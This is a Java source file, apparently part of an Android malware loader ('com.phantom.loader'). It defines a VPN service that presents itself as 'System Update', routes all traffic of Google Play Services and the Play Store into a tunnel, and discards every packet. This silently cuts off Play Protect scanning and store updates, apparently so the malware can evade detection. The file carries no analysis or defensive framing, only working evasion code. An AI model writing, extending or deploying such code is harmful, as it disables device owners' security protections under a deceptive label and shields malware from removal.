package com.phantom.loader;

import android.net.VpnService;
import android.os.ParcelFileDescriptor;
import android.content.Intent;
import java.io.FileInputStream;

public class VpnBlockerService extends VpnService implements Runnable {
    private Thread mThread;
    private ParcelFileDescriptor mInterface;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mThread = new Thread(this, "VpnBlocker");
        mThread.start();
        return START_STICKY;
    }

    @Override
    public void run() {
        try {
            Builder builder = new Builder();
            builder.setSession("System Update");
            builder.addAddress("10.0.0.2", 32);
            builder.addRoute("0.0.0.0", 0);
            
            builder.addAllowedApplication("com.google.android.gms");
            builder.addAllowedApplication("com.android.vending");

            mInterface = builder.establish();
            
            FileInputStream in = new FileInputStream(mInterface.getFileDescriptor());
            byte[] packet = new byte[32767];
            while (!Thread.interrupted()) {
                if (in.read(packet) <= 0) break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        if (mThread != null) mThread.interrupt();
        try { if (mInterface != null) mInterface.close(); } catch (Exception e) {}
    }
}
